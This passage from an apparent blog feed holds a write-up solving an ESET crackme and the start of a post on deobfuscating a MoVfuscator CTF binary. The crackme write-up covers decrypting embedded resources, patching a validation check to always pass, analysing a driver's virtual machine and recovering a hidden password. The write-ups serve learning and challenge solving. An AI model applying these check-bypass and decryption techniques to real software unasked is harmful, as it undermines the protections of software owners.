&lt;p&gt;The program first computes the MD5 of its assembly - &lt;strong&gt;a26d11dee294284f38db8a724c119d74&lt;/strong&gt;. Then in Form_Load event, it fetches the resource &lt;strong&gt;0xFF05&lt;/strong&gt; (command 1) and decrypts (AES) using the MD5 as the key.&lt;/p&gt;
&lt;p&gt;The resource 0xFF05 is another &lt;strong&gt;.NET DLL&lt;/strong&gt;. In the click event of the &amp;ldquo;Read punch cards&amp;rdquo; button, the program first decodes the images (&amp;ldquo;punch_card_X.bmp&amp;rdquo;) generated by PuncherMachine. It then invokes the method returned by &lt;code&gt;DynMethod.createMethod&lt;/code&gt;, using the decoded strings as arguments.&lt;/p&gt;
&lt;p&gt;In createMethod, a hashtable is created with keys as IL opcode names, with the corresponding IL opcode instances. And a dynamic method is returned which contains&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.local uint
.local uint
.local uint
.local uint
.local uint
.local uint
.local byte[]
.local uint
.local bool
.local bool

nop
ldc.i4 57005
stloc.0
ldc.i4 48879
stloc.1
ldc.i4 51966
stloc.2
ldc.i4 47806
stloc.3
ldc.i4 64206
stloc.s 4

ldloc.0
ldloc.1
OPCODE[instr[0]]                    ; t0 = i[0](57005, 48879)
ldloc.2
ldloc.3
OPCODE[instr[1]]                    ; t1 = i[1](51966, 47806)
xor
ldloc.s 4
xor
ldc.i4 -229612108
xor
stloc.s 5                           ; t0 ^ t1 ^ 64206 ^ -229612108

call Encoding.ASCII
ldstr &amp;quot;ESET&amp;quot;
callvirt GetBytes
stloc.s 6

ldloc.s 6
ldc.i4.0
call BitConverter.ToUInt32
stloc.s 7                           ; 0x54455345

ldloc.s 5
ldloc.s 7
ceq
ldc.i4.0
ceq
stloc.s 9
ldloc.s 9
brtrue.s L0
ldc.i4.1
stloc.s 8
br.s L1

L0:
    ldc.i4.0
    stloc.s 8
    br.s L1

L1:
    ldloc.s 8
    OPCODE[instr[2]]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, two things are clear now. First the number of instructions is 3, i.e., we have to enter three lines in the PuncherMachine. Secondly, the last instruction (instr[2]) has to be &lt;strong&gt;ret&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now, the task is, find operators O1 and O2 such that the following holds&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O1(57005, 48879) ^ O2(51966, 47806) ^ 64206 ^ -229612108 == ‘ESET’[::-1].encode(‘hex’)

i.e., O1(57005, 48879) ^ O2(51966, 47806) ^ 64206 ^ -229612108 == 0x54455345
    =&amp;gt;  O1(57005, 48879) ^ O2(51966, 47806) == 64206 ^ -229612108 ^ 0x54455345
    =&amp;gt;  O1(57005, 48879) ^ O2(51966, 47806) == 0xa615cc3f
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System&lt;/span&gt;;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System.Reflection&lt;/span&gt;;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;System.Reflection.Emit&lt;/span&gt;;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;FindInstructions&lt;/span&gt;
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;delegate&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;bool&lt;/span&gt; Solver();

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; Main()
    {
        OpCode[] candidates = {
            OpCodes.Add, OpCodes.Mul, OpCodes.Or, OpCodes.Xor
        };
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; op1 &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; candidates)
        {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; op2 &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; candidates)
            {
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; methSolve = &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; DynamicMethod(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Solver&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;bool&lt;/span&gt;), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;new&lt;/span&gt; Type[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]);
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;var&lt;/span&gt; ilGen = methSolve.GetILGenerator();
                ilGen.Emit(OpCodes.Ldc_I4, &lt;span style=&#34;color:#3677a9&#34;&gt;57005&lt;/span&gt;);
                ilGen.Emit(OpCodes.Ldc_I4, &lt;span style=&#34;color:#3677a9&#34;&gt;48879&lt;/span&gt;);
                ilGen.Emit(op1);
                ilGen.Emit(OpCodes.Ldc_I4, &lt;span style=&#34;color:#3677a9&#34;&gt;51966&lt;/span&gt;);
                ilGen.Emit(OpCodes.Ldc_I4, &lt;span style=&#34;color:#3677a9&#34;&gt;47806&lt;/span&gt;);
                ilGen.Emit(op2);
                ilGen.Emit(OpCodes.Xor);
                ilGen.Emit(OpCodes.Ldc_I4, &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;xa615cc3f);
                ilGen.Emit(OpCodes.Ceq);
                ilGen.Emit(OpCodes.Ret);
                Solver solve = (Solver) methSolve.CreateDelegate(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;typeof&lt;/span&gt;(Solver));
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (solve())
                {
                    Console.WriteLine(
                        &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;First OpCode - {0}\nSecond OpCode - {1}&amp;#34;&lt;/span&gt;,
                        op1.Name, op2.Name
                    );
                }
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Executing it, we get the first opcode - &lt;strong&gt;mul&lt;/strong&gt; and the second opcode - &lt;strong&gt;add&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So, the first and second instructions are MUL, and ADD. Now we have to enter the strings - &lt;strong&gt;MUL&lt;/strong&gt;, &lt;strong&gt;ADD&lt;/strong&gt;, &lt;strong&gt;RET&lt;/strong&gt; into the PuncherMachine to get three punch cards.&lt;/p&gt;
&lt;p&gt;Now PunchCardReader sends command 2 (Mark Resource) for resource 0xFF01, and displays a message dialog &amp;ldquo;Verification passed &amp;hellip;&amp;rdquo;&amp;quot;&lt;/p&gt;
&lt;p&gt;Now that we have marked resources 0xBB01 and 0xFF01, we still have resources 0xBB02 and 0xBB03 left to be marked.&lt;/p&gt;
&lt;p&gt;Decoding resource 0xBB01 by xoring with the key &amp;ldquo;PIPE&amp;rdquo;, we get three hashes.&lt;br&gt;
If the hash of the second password matches &lt;strong&gt;0F30181CF3A9857360A313DB95D5A169BED7CC37&lt;/strong&gt; and that of the third password matches &lt;strong&gt;0B6A1C6651D1EB5BD21DF5921261697AA1593B7E&lt;/strong&gt;, the resources 0xBB02 and 0xBB03 get marked.&lt;/p&gt;
&lt;p&gt;Till now I’ve used a bitmap 600x259 consisting of a white background and bypassing &lt;code&gt;IEnumerable.SequenceEquals&lt;/code&gt; for PuncherMachine, forcing it to return true while validating the image.&lt;/p&gt;
&lt;p&gt;The only way to send a mark resource message for resources 0xBB02 and 0xBB03 is by matching the respective hashes. Finding by brute force is unacceptable.&lt;/p&gt;
&lt;p&gt;So, the passwords must be encoded in the program itself. The crackme driver decodes the resources &lt;strong&gt;0xAA02&lt;/strong&gt;, &lt;strong&gt;0xAA06&lt;/strong&gt; using &lt;strong&gt;RC4&lt;/strong&gt;, the key is &lt;strong&gt;3531_4ever&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The driver creates a device &lt;strong&gt;\Device\45736574&lt;/strong&gt; i.e., &lt;code&gt;&amp;quot;Eset&amp;quot;.encode(&amp;quot;hex&amp;quot;)&lt;/code&gt; and the main executable on receiving 0xAA10 mark command, extracts the resource &lt;strong&gt;0x155&lt;/strong&gt; with name &amp;ldquo;PunchCard.bmp&amp;rdquo; into the path &lt;strong&gt;\?\GLOBALROOT\Device\45736574\PunchCard.bmp&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;the-driver&#34;&gt;The Driver&lt;/h2&gt;
&lt;p&gt;The AddDevice routine of the driver extension sets up a FAT disk. In LoadFatEntries, it queries the FAT params like &amp;ldquo;Parameters&amp;rdquo;, &amp;ldquo;DiskSize&amp;rdquo;, etc. from the Registry otherwise sets up with default values. Default Disk size is 0x1E00000 bytes or 30MB. RootDirectoryEntries is set to 0x200 and 2 sectors per cluster. It then spawns two threads.&lt;/p&gt;
&lt;p&gt;The first thread sends a fetch command for resource 0xaa02 (&lt;strong&gt;ESETConst&lt;/strong&gt;), decrypts it with rc4 key &lt;strong&gt;3531_4ever&lt;/strong&gt; and spawns a new thread which reads the value of &amp;ldquo;ESETConst&amp;rdquo; registry key and stores in a global variable str (at end of data section)&lt;/p&gt;
&lt;p&gt;Thread2 initializes another virtual machine&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:9C6B5329                 call    ds:ExAllocatePool
.text:9C6B532F                 mov     ecx, [ebp+var_14]
.text:9C6B5332                 mov     [ecx+64h], eax
.text:9C6B5335                 mov     edx, [ebp+var_14]
.text:9C6B5338                 mov     dword ptr [edx+68h], 21ACh
.text:9C6B533F                 push    21ACh           ; MaxCount
.text:9C6B5344                 push    offset vm_code  ; Src
.text:9C6B5349                 mov     eax, [ebp+var_14]
.text:9C6B534C                 mov     ecx, [eax+64h]
.text:9C6B534F                 push    ecx             ; Dst
.text:9C6B5350                 call    memcpy
.text:9C6B5355                 add     esp, 0Ch
.text:9C6B5358                 push    21ACh           ; size
.text:9C6B535D                 mov     edx, [ebp+var_14]
.text:9C6B5360                 mov     eax, [edx+64h]
.text:9C6B5363                 push    eax             ; buf
.text:9C6B5364                 call    RC4Decrypt
.text:9C6B5369                 push    2B5h            ; NumberOfBytes
.text:9C6B536E                 push    0               ; PoolType
.text:9C6B5370                 call    ds:ExAllocatePool
.text:9C6B5376                 mov     ecx, [ebp+var_14]
.text:9C6B5379                 mov     [ecx+70h], eax
.text:9C6B537C                 mov     edx, [ebp+var_14]
.text:9C6B537F                 mov     dword ptr [edx+74h], 2B5h
.text:9C6B5386                 push    2B5h            ; MaxCount
.text:9C6B538B                 push    offset code_to_exec ; Src
.text:9C6B5390                 mov     eax, [ebp+var_14]
.text:9C6B5393                 mov     ecx, [eax+70h]
.text:9C6B5396                 push    ecx             ; Dst
.text:9C6B5397                 call    memcpy
.text:9C6B539C                 add     esp, 0Ch
.text:9C6B539F                 push    2B5h            ; size
.text:9C6B53A4                 mov     edx, [ebp+var_14]
.text:9C6B53A7                 mov     eax, [edx+70h]
.text:9C6B53AA                 push    eax             ; buf
.text:9C6B53AB                 call    RC4Decrypt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, it sets up offset +0x64 with the VM and +0x70 with the code to execute on the vm. It then fetches resource 0xaa06 which seems to be some patch to the code to execute. After decrypting 0xaa06 (rc4)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;.text:9C6B561E                 mov     eax, [ebp+Length]
.text:9C6B5621                 push    eax             ; MaxCount
.text:9C6B5622                 mov     ecx, [ebp+P]
.text:9C6B5625                 push    ecx             ; Src
.text:9C6B5626                 mov     edx, [ebp+var_14]
.text:9C6B5629                 mov     eax, [edx+70h]
.text:9C6B562C                 add     eax, 26Dh
.text:9C6B5631                 push    eax             ; Dst
.text:9C6B5632                 call    memcpy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patched code is placed at +0x26d wrt the code to execute. Here’s the script that saves the patched code&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; ARC4

key = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;3531_4ever&amp;#39;&lt;/span&gt;
d = &lt;span style=&#34;color:#24909d&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;0xaa06.bin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;).read()
d = ARC4.new(key).decrypt(d)

code = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&amp;#39;CAE23DEDCDE3016FB7080893AA91A5E3F599D4A36E81E7013512F4D971C64AF57B4428D746C58D05256B06684CB6CE8BDCDB85C77C1FC782C06150714B5C1AD028067029AC959DDEA4BF3F1210EAFA3100CC38BC08D90E933537D8683CD5707544A2D586B3257F7CDBE684B3F65F564A0F699A4C0F0C548D6352FF91DE8A13BFB8E13BDFBFDD3483CB3E93F7549251163DE2FDD7071D63D25EB771AB97B2DA722506805CE813D4E6066970E6E02C2C1823C4A58F2AB2641B87F784D84A7CF5B65B912EC8E5E10A1E5D5C52E382DF2BEB32CC673F6D6843D39615DBEC15095C5FDD20375678DFD28589FD01A92F3E47DCFABE014BC07C336D4A69489E07902A6E4CE44B760705FB531FECC745FCE1EC247A1698D8B186CCF36AF58FA01A1A4EE61926488B72B26B3EDF0B578CB25EE9359B99113A62FD17B03410A84D67239D157E01886B1168C10D064B909ACBFB123776E2F80E6C366BD63CC8EE86DCD754BF023FA2CD7ACD6C4A56643A26D1A29128518C9866EF0EBDF6407653A475A5DB1544CEFCFC33EE441A565975CA1CEC192B0D2A35B07FD68A0D12CBAA45F01490948464D15326F03C489F3D65B0E7F9A103236356CBAE883B0C4CD5348B80B08344CC61CA3E3DB4E1D49D7EA16BAC68E5AAD801AAF7B752A75B18BE07989BEA79D832F435F08B25AD387A8B893470CD0FD7748B5C3D13C63A5BF05DC484836BE4516D8D0D162E184311894E12E5A7BDAA8AFE219DFF6CE97621D9FDCF3B3E388A354BADB6231787E081AAF0FE26EA4AACCF1F5EF7632B4A33104B2C593014C639F71735179FDD5899394FA9D69BC217E578E961DE0769DB942855E1E2FDB608ADE61D30D7750F2CA67E839006372B71250DE6052293E108D6C62A884096513541464CDC38C2EBEE985AF75B6E211BA8CE4AEC8C2EC6FF5C7FD86EA27C65191A5E10CC179220622AD66AB656E4E020552DC14B8F544EB0&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
code = code.decode(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;)
code = ARC4.new(key).decrypt(code)
code = &lt;span style=&#34;color:#24909d&#34;&gt;list&lt;/span&gt;(code)
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(d)):
    code[&lt;span style=&#34;color:#3677a9&#34;&gt;0x26d&lt;/span&gt;+i] = d[i]

&lt;span style=&#34;color:#24909d&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;code.bin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;).write(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(code))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/eset/i0.PNG&#34; alt=&#34;i0&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It seems like the size of the VM (0x2b5) is placed at offset +0x2. Here’s the Driver VM layout&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; res_t
{
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; sign[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;];
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; size;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; code_off;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; data_off;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; bModuleLoaded;
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; stream[];
} __attribute__((packed));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;00    ldr X, 0
        cmp.eq X, R12
04    ldr X, 0x8a
        jmp.cc X
0a    ldr X, 0
        cmp.eq X, R13
0e    ldr X, 0x11e
        jmp.cc X
14    ldr X, R12
        str X, R2
17    ldr X, &amp;amp;[0x295]
        str X, R3
1e    ldr X, &amp;amp;[0x268]
        str X, R4
25    ldr X, R2
        str X, R5
28    ldr X, R13
        add R5, X
2b    ldr X, R3
        str X, R14
2e    ldr X, &amp;amp;[0x291]
        str X, R0
35    ldr X, dword ptr [R0]
        add R14, X
38    ldr X, R4
        str X, R15
3b    ldr X, 0x4
        add R15, X
3f    ldr X, R5
        cmp.neq X, R2
42    ldr X, 0x4b
        jmp.cc X
48    ldr X, R12
        str X, R2
4b    ldr X, R15
        cmp.neq X, R4
4e    ldr X, 0x5b
        jmp.cc X
54    ldr X, &amp;amp;[0x268]
        str X, R4
5b    ldr X, R14
        cmp.eq X, R3
5e    ldr X, 0x100
        jmp.cc X
64    ldr X, byte ptr [R2]
        str X, R0
67    ldr X, byte ptr [R3]
        xor R0, X
6a    ldr X, 0x1
        add R0, X
6e    ldr X, 0x1
        rolb R0, X
72    ldr X, byte ptr [R4]
        xor R0, X
75    ldr X, R0
        str X, byte ptr [R3]
78    ldr X, 0x1
        add R2, X
7c    ldr X, 0x1
        add R3, X
80    ldr X, 0x1
        add R4, X
84    ldr X, 0x3f
        jmp X
8a    ldr X, &amp;amp;[0x271]
        str X, R3
91    ldr X, &amp;amp;[0x268]
        str X, R4
98    ldr X, R3
        str X, R14
9b    ldr X, &amp;amp;[0x26d]
        str X, R0
a2    ldr X, dword ptr [R0]
        add R14, X
a5    ldr X, R4
        str X, R15
a8    ldr X, 0x4
        add R15, X
ac    ldr X, R15
        cmp.neq X, R4
af    ldr X, 0xbc
        jmp.cc X
b5    ldr X, &amp;amp;[0x268]
        str X, R4
bc    ldr X, R14
        cmp.eq X, R3
bf    ldr X, 0xe8
        jmp.cc X
c5    ldr X, 0
        str X, R0
c9    ldr X, byte ptr [R3]
        xor R0, X
cc    ldr X, 0x1
        add R0, X
d0    ldr X, 0x1
        rolb R0, X
d4    ldr X, byte ptr [R4]
        xor R0, X
d7    ldr X, R0
        str X, byte ptr [R3]
da    ldr X, 0x1
        add R3, X
de    ldr X, 0x1
        add R4, X
e2    ldr X, 0xac
        jmp X
e8    ldr X, &amp;amp;[0x26d]
        str X, R0
ef    ldr X, dword ptr [R0]
        str X, R0
f2    ldr X, R0
        push X
f4    ldr X, &amp;amp;[0x271]
        push X
fa    ldr X, 0x112
        jmp X
100    ldr X, &amp;amp;[0x291]
        str X, R0
107    ldr X, dword ptr [R0]
        str X, R0
10a    ldr X, R0
        push X
10c    ldr X, &amp;amp;[0x295]
        push X
112    ldr X, R11
        push X
114    ldr X, R10
        push X
116    emulate
11e    hlt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The arguments are - R12 contains str (the global variable containing &amp;ldquo;ESETConst&amp;rdquo; value), R13 contains len(str). The notation &lt;strong&gt;&amp;amp;[X]&lt;/strong&gt; defines the &lt;strong&gt;address of offset X&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;So, if nothing is passed to &amp;ldquo;ESETConst&amp;rdquo;, the control jumps to &lt;strong&gt;0x8a&lt;/strong&gt;. This loop decrypts a 0x12 byte key&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;l = [&lt;span style=&#34;color:#3677a9&#34;&gt;0x82&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x8f&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x92&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x9e&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x94&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xb1&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x8e&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x8f&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x9c&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x1a&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x9d&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0xa8&lt;/span&gt;]

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;rol&lt;/span&gt;(x):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; (x &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt; | x &amp;gt;&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;) &amp;amp; &lt;span style=&#34;color:#3677a9&#34;&gt;0xff&lt;/span&gt;

k = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;ETSE&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(l)):
    t = rol(l[i]+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)
    l[i] = &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(k[i&amp;amp;&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;])^t)

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;.join(l)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It prints out &lt;code&gt;Barbakan Krakowski&lt;/code&gt; which is the second password!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Solved Finally!&lt;/p&gt;
&lt;/blockquote&gt;</description>
        </item>
        <item>
        <title>Deobfuscating MoVfuscator - Part 2</title>
        <link>http://localhost:1313/post/deobfuscating-movfuscator-part-2/</link>
        <pubDate>Tue, 09 Apr 2019 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/deobfuscating-movfuscator-part-2/</guid>
        <description>&lt;p&gt;I&amp;rsquo;ll be analyzing another MoVfuscated binary, from Swamp CTF 2019 using IDA Free&lt;br&gt;
Deep on the web, I discovered a secret key validation.&lt;br&gt;
It appeared to be from the future, and it only had one sentence: &amp;ldquo;Risk speed for security&amp;rdquo;.&lt;br&gt;
Something seems fishy, you should try to break the key and find the secret inside!&lt;br&gt;
-= Created by noopnoop =-&lt;/p&gt;
&lt;p&gt;We know that the MoVfuscator stack consists of an array of addresses.&lt;br&gt;
Let &lt;code&gt;stack[i]&lt;/code&gt; store the value &lt;code&gt;&amp;amp;A[i]&lt;/code&gt;. Then we have the invariant &lt;code&gt;stack[i]-&amp;amp;stack[i] == 0x200064&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;fp&lt;/code&gt; and &lt;code&gt;NEW_STACK&lt;/code&gt; are pointers to the array &lt;code&gt;stack&lt;/code&gt;. &lt;code&gt;fp&lt;/code&gt; denotes the frame pointer, and &lt;code&gt;NEW_STACK&lt;/code&gt; denotes the stack top pointer.&lt;/p&gt;
&lt;p&gt;We also know that the stack grows towards lower address. So, how do we push and pop ?&lt;/p&gt;
&lt;h2 id=&#34;push&#34;&gt;Push&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;    &amp;amp;stack[i]   = stack[i] - 0x200064
    &amp;amp;stack[i+1] = &amp;amp;stack[i] - 4
                = stack[i] - 0x200068
    stack[i+1]  = *(stack[i] - 0x200068)
    stack[i+2]  = *(stack[i+1] - 0x200068)
    ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/swamp/push.png&#34; alt=&#34;push&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;pop&#34;&gt;Pop&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;    &amp;amp;stack[i]   = stack[i] - 0x200064
    &amp;amp;stack[i-1] = &amp;amp;stack[i] + 4
                = stack[i] - 0x200060
    stack[i-1]  = *(stack[i] - 0x200060)
    stack[i-2]  = *(stack[i-1] - 0x200060)
    ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/swamp/pop.png&#34; alt=&#34;pop&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;function-call&#34;&gt;Function Call&lt;/h2&gt;
&lt;h3 id=&#34;user-defined-functions&#34;&gt;User Defined Functions&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/swamp/call.png&#34; alt=&#34;call_user&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It pushes the return address, and then sets the &lt;code&gt;target&lt;/code&gt; variable to &lt;code&gt;branch_temp&lt;/code&gt;. So, the above sequence, skips through until it reaches 0x805036A&lt;/p&gt;
&lt;h3 id=&#34;external-functions&#34;&gt;External Functions&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/swamp/ecall.png&#34; alt=&#34;ecall&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;These functions are called through a &lt;strong&gt;SIGSEGV&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Every movfuscator instruction except the ALU ops are conditional. That is the operation depends on &lt;code&gt;on&lt;/code&gt; variable. So, how are jumps, conditionals implemented ?&lt;/p&gt;
&lt;p&gt;Jumps and conditionals are implemented using a &lt;code&gt;target&lt;/code&gt; variable. Whenever you see &lt;code&gt;target&lt;/code&gt; being compared with a virtual address, you can tell it is the &lt;strong&gt;beginning of a basic block&lt;/strong&gt;.&lt;/p&gt;
